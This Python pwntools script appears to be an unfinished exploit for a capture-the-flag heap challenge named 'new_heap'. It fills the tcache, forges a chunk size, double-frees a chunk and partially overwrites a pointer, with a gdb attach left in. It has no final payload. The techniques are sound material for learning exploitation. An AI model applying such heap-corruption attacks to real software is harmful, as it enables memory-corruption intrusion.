#!/usr/bin/env python
# -*- coding: utf-8 -*-
from __future__ import print_function
from pwn import *

binary = './new_heap'
elf = ELF(binary)
libc = elf.libc

io = process(binary, aslr = 0)
context.log_level = 'debug'
context.arch = elf.arch
context.terminal = ['tmux', 'splitw', '-h']

myu64 = lambda x: u64(x.ljust(8, '\0'))
ub_offset = 0x3c4b30
codebase = 0x555555554000

def menu(idx):
    io.recvuntil('3.exit')
    io.sendline(str(idx))

def new(sz, cont):
    menu(1)
    io.recvuntil(":")
    io.sendline(str(sz))
    io.recvuntil(":")
    io.sendline(cont)

def free(idx):
    menu(2)
    io.recvuntil(":")
    io.sendline(str(idx))

io.recvuntil("good present for African friends:")
char = int(io.recvuntil("\n", drop = True), 16)

new(0x78, '0' * 8)
new(0x78, '1' * 8)
new(0x78, '2' * 8)
new(0x78, '3' * 8)
new(0x78, '4' * 8)
new(0x78, '5' * 8)
new(0x78, '6' * 8)
new(0x78, '7' * 8)
new(0x78, '8' * 8)

free(0)
free(1)
free(2)
free(3)
free(4)
free(6)
free(7)

free(8)
new(0x78, '\0' * 0x28 + p64(0x51))
gdb.attach(io, '')
free(8)
new(0x78, '\xb0' + chr(char + 0x4))




io.interactive()
